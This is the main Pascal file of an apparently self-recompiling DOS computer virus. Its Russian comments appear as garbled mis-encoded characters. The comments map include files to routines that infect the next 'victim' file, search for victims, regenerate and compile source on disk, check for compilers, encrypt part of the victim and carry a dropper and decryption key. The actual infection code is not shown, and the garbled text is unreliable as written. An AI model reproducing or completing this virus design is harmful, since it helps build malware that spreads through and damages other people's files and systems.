   (*
   s0 - ®¯¨á ¨¥ ¯¥à¥¬¥ëå, ª®áâ â, ¨ ¯à®æ¥¤ãà á ¤¨à¥ªâ¨¢®© forward
   s1 - proc. Infect - § à ¦ ¥â ®ç¥à¥¤ãî ¦¥àâ¢ã
   s2 - proc. FindFile - ¯®¨áª ¦¥àâ¢
   s3 - proc. MakeInc - ¢®áá®§¤ ¥â   ¤¨áª¥ INC-ä ©«ë
   s4 - proc. MakePas - á®§¤ ¥â ¨ ª®¬¯¨«¨àã¥â PAS-ä ©«
   s5 - proc. Start - £« ¢ ï à ¡®â îé ï ¯à®æ¥¤ãà 
   s6 - func. DetectComp - ¯à®¢¥àª   «¨ç¨ï ª®¬¯¨«ïâ®à®¢
   s7 - proc. Demon - ¯à®ï¢«¥¨ï ¢¨àãá 
   s8 - proc. Crypt - è¨äà®¢ª  ªãáª  ¦¥àâ¢ë
   sd - ¬ áá¨¢ á ä ©«®¬ sd.com
   sk - ¬ áá¨¢ á ª«îç®¬ ¤«ï à áè¨äà®¢ª¨
   *)

   uses dos;
   const DropLen=2522;
   {$I s0.inc}
   {$I s1.inc}
   {$I s2.inc}
   {$I s3.inc}
   {$I s4.inc}
   {$I s5.inc}
   {$I s6.inc}
   {$I s7.inc}
   {$I s8.inc}
   begin
   Start
   end.
